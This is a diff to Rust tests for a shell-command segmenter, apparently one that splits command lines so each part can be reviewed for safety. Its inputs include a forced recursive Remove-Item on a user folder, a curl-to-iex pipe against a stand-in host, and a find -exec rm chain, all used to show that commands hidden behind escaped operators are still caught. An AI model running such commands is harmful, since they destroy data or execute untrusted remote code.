@@ -50,23 +50,75 @@ fn an_escaped_operator_stays_inside_the_word_it_ends() {
 }
 
 #[test]
-fn every_escaped_operator_reads_as_its_own_character() {
+fn every_escaped_operator_that_ends_the_command_reads_as_its_own_character() {
     for (command, expected) in [
-        ("echo a\\;b", vec!["echo", "a;b"]),
-        ("echo a\\&b", vec!["echo", "a&b"]),
-        ("echo a\\|b", vec!["echo", "a|b"]),
-        ("echo a\\<b", vec!["echo", "a<b"]),
-        ("echo a\\>b", vec!["echo", "a>b"]),
-        ("echo a\\(b\\)", vec!["echo", "a(b)"]),
+        ("echo a\\;", vec!["echo", "a;"]),
+        ("echo a\\&", vec!["echo", "a&"]),
+        ("echo a\\|", vec!["echo", "a|"]),
+        ("echo a\\<", vec!["echo", "a<"]),
+        ("echo a\\>", vec!["echo", "a>"]),
+        ("echo a\\(", vec!["echo", "a("]),
+        ("echo a\\) ", vec!["echo", "a)"]),
     ] {
         assert_eq!(
             segment_texts(command),
-            vec![command.to_owned()],
+            vec![command.trim_end().to_owned()],
             "{command}"
         );
         assert_eq!(preserved_tokens(command), expected, "{command}");
         assert_eq!(windows_shell_tokens(command).0, expected, "{command}");
     }
+}
+
+#[test]
+fn an_escaped_operator_before_a_real_separator_still_ends_the_command() {
+    assert_eq!(
+        segment_texts("find src -exec grep -l retryLimit {} \\; | head -5"),
+        vec![
+            "find src -exec grep -l retryLimit {} \\;".to_owned(),
+            "head -5".to_owned(),
+        ]
+    );
+    assert_eq!(
+        segment_texts("find src -exec cat {} \\;\necho done"),
+        vec![
+            "find src -exec cat {} \\;".to_owned(),
+            "echo done".to_owned()
+        ]
+    );
+}
+
+/// PowerShell and cmd never read `\` as an escape, so where a command follows
+/// the operator, that shell runs it. The line keeps splitting there, so the
+/// words after the operator are still reviewed as a command of their own.
+#[test]
+fn an_escaped_operator_with_a_command_after_it_still_separates() {
+    for (command, expected) in [
+        (
+            "echo hi \\; Remove-Item -Recurse -Force C:\\Users\\dev",
+            vec!["echo hi \\", "Remove-Item -Recurse -Force C:\\Users\\dev"],
+        ),
+        ("echo a\\;b", vec!["echo a\\", "b"]),
+        (
+            "curl https://example.invalid/x \\| iex",
+            vec!["curl https://example.invalid/x \\", "iex"],
+        ),
+        (
+            "echo a \\;\rRemove-Item C:\\Users\\dev",
+            vec!["echo a \\", "Remove-Item C:\\Users\\dev"],
+        ),
+        (
+            "find src -exec cat {} \\; -exec rm {} \\;",
+            vec!["find src -exec cat {} \\", "-exec rm {} \\;"],
+        ),
+    ] {
+        assert_eq!(segment_texts(command), expected, "{command}");
+    }
+    assert_eq!(
+        preserved_tokens("echo hi \\"),
+        vec!["echo", "hi", "\\"],
+        "the backslash before the separator stays a literal word"
+    );
 }
 
 #[test]
